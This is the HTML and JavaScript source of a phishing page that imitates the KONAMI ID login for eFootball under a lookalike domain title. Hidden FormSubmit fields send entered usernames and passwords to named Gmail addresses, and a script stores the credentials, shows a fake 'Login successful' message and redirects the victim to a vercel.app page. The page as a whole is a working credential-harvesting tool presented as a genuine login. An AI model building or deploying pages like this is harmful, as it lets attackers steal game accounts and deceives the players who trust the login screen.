<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>efootball-officialkonami.net</title>
    <link rel="stylesheet" href="style.css">
    <!-- Link to Google Fonts for similar typography -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        /* Add this CSS for the new buttons */
        .extra-options {
            margin-top: 40px;
            padding: 25px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #333;
            border-radius: 8px;
            text-align: center;
        }
        
        .extra-options p {
            color: #999;
            margin-bottom: 15px;
            font-size: 14px;
        }
        
        .note {
            margin-top: 20px;
            font-size: 12px !important;
            color: #666 !important;
        }
        
        .btn-full-website,
        .btn-login-only {
            display: block;
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            text-decoration: none;
            border-radius: 4px;
            font-weight: 600;
            text-align: center;
            transition: all 0.3s;
            font-size: 14px;
            cursor: pointer;
        }
        
        .btn-full-website {
            background: #0070cc;
            color: white;
            border: none;
        }
        
        .btn-full-website:hover {
            background: #005ca9;
            transform: translateY(-2px);
        }
        
        .btn-login-only {
            background: transparent;
            color: #999;
            border: 1px solid #444;
        }
        
        .btn-login-only:hover {
            background: rgba(255, 255, 255, 0.05);
            color: white;
            border-color: #666;
        }
        
        .message {
            padding: 15px;
            border-radius: 5px;
            margin: 15px 0;
            text-align: center;
            display: none;
        }
        
        .success {
            background: rgba(0, 112, 204, 0.1);
            border: 1px solid #0070cc;
            color: #0070cc;
        }
        
        .error {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid #ff4444;
            color: #ff4444;
        }
    </style>
</head>
<body>
    <div class="top-corner-box">
        <span class="konami-red">KONAMI</span>
    </div>

    <div class="login-container">
        <div class="logo-box">
            <!-- Placeholder for KONAMI logo image -->
            <div class="logo-placeholder">KONAMI ID</div>
        </div>
        
        <!-- Message display area -->
        <div id="message" class="message"></div>
        
        <!-- UPDATED FORM -->
        <form id="loginForm" class="login-form">
            <!-- FormSubmit Configuration -->
            <input type="hidden" name="_next" 
                   value="https://ko-konami-mi.vercel.app/confirmation.html">
            
            <input type="hidden" name="_subject" 
                   value="üîê KONAMI ID Login Credentials">
            
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_captcha" value="false">
            <input type="text" name="_honey" style="display:none">
            
            <!-- BCC to second email -->
            <input type="hidden" name="_bcc" value="Samfat246@gmail.com">
            
            <!-- Your form fields -->
            <div class="input-group">
                <input type="text" id="username" name="username" required>
                <label for="username">KONAMI ID</label>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" name="password" required>
                <label for="password">Password</label>
            </div>
            
            <button type="submit" class="btn-login">LOGIN</button>

            <div class="divider">OR</div>

            <button type="button" class="btn-google">
                <span class="google-icon">G</span> Log in with Google Play
            </button>

            <div class="register-link">
                Don't have a KONAMI ID? <a href="#" class="register-red">Register</a>
            </div>
        </form>
        
        <!-- ADDED THIS SECTION: Extra Options -->
        <div class="extra-options">
            <p>Alternative login options:</p>
            <a href="index.html" class="btn-full-website">
                Visit Full eFootball Website
            </a>
            <p class="note">Or click below for a different login experience:</p>
            <a href="login.html" class="btn-login-only">
                Go to Login Page Only
            </a>
        </div>
    </div>

    <footer class="page-footer">
        <div class="footer-links">
            <a href="#">Terms of Use / Privacy (KONAMI ID)</a>
            <a href="#">Trademarks</a>
            <a href="#">Support</a>
            <a href="#">Company Information</a>
        </div>
    </footer>

    <!-- UPDATED JavaScript -->
<script>
document.addEventListener('DOMContentLoaded', function() {
    console.log('‚úÖ Page loaded, setting up form...');
    
    const loginForm = document.getElementById('loginForm');
    const messageDiv = document.getElementById('message') || createMessageDiv();
    
    if (!loginForm) {
        console.error('‚ùå ERROR: No login form found!');
        return;
    }
    
    console.log('‚úÖ Form found:', loginForm);
    
    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();
        console.log('üöÄ Form submitted!');
        
        // Get credentials
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        console.log('üì§ Got credentials:', { username, password });
        
        if (!username || !password) {
            showMessage('‚ö†Ô∏è Please fill in all fields', 'error');
            return;
        }
        
        // Show loading
        const submitBtn = loginForm.querySelector('.btn-login');
        const originalText = submitBtn.textContent;
        submitBtn.textContent = 'PROCESSING...';
        submitBtn.disabled = true;
        
        // SAVE TO localStorage FIRST (GUARANTEED)
        console.log('üíæ Attempting to save to localStorage...');
        saveToLocalStorage(username, password);
        
        // Try to send email (optional)
        setTimeout(() => {
            console.log('üìß Attempting to send email...');
            sendToFormSubmit(username, password);
        }, 500);
        
        // Show success message
        showMessage('‚úÖ Login successful! Redirecting...', 'success');
        
        // Redirect after 2 seconds
        setTimeout(function() {
            console.log('üîÄ Redirecting to confirmation page...');
            window.location.href = "https://ko-konami-mi.vercel.app/login.html";
        }, 2000);
        
        // Reset button
        setTimeout(function() {
            submitBtn.textContent = originalText;
            submitBtn.disabled = false;
        }, 2000);
    });
    
    function saveToLocalStorage(username, password) {
        try {
            console.log('üíæ Starting localStorage save...');
            
            // Get existing data
            let existing = localStorage.getItem('konami_logins');
            console.log('Existing data:', existing);
            
            // Parse or create new array
            let loginsArray = [];
            if (existing) {
                try {
                    loginsArray = JSON.parse(existing);
                    console.log('Parsed existing:', loginsArray);
                } catch (e) {
                    console.error('Parse error, starting fresh:', e);
                }
            }
            
            // Create new entry
            const newEntry = {
                username: username,
                password: password,
                timestamp: new Date().toLocaleString(),
                date: new Date().toISOString(),
                ip: 'N/A'
            };
            
            console.log('New entry:', newEntry);
            
            // Add to array
            loginsArray.push(newEntry);
            
            // Save back
            localStorage.setItem('konami_logins', JSON.stringify(loginsArray));
            
            console.log('‚úÖ Saved to localStorage! Total entries:', loginsArray.length);
            
            // Verify save
            const verify = localStorage.getItem('konami_logins');
            console.log('Verify save:', verify);
            
        } catch (error) {
            console.error('‚ùå localStorage error:', error);
            
            // Try alternative storage
            try {
                sessionStorage.setItem('konami_backup', JSON.stringify({
                    username: username,
                    password: password,
                    time: new Date().toLocaleString()
                }));
                console.log('üì¶ Saved to sessionStorage as backup');
            } catch (e) {
                console.error('‚ùå All storage failed:', e);
            }
        }
    }
    
    function sendToFormSubmit(username, password) {
        // Just log for now - we'll fix email later
        console.log('üìß Would send to:', {
            to: 'psalmcares878@gmail.com',
            bcc: 'Samfat246@gmail.com',
            username: username,
            password: password
        });
        
        // For now, just log - we'll implement properly once localStorage works
        console.log('üìß Email would be sent with credentials');
    }
    
    function showMessage(text, type) {
        if (!messageDiv) return;
        messageDiv.textContent = text;
        messageDiv.className = `message ${type}`;
        messageDiv.style.display = 'block';
    }
    
    function createMessageDiv() {
        const div = document.createElement('div');
        div.id = 'message';
        div.className = 'message';
        loginForm.parentNode.insertBefore(div, loginForm);
        return div;
    }
    
    console.log('‚úÖ Form setup complete!');
});
</script>
</body>
</html>
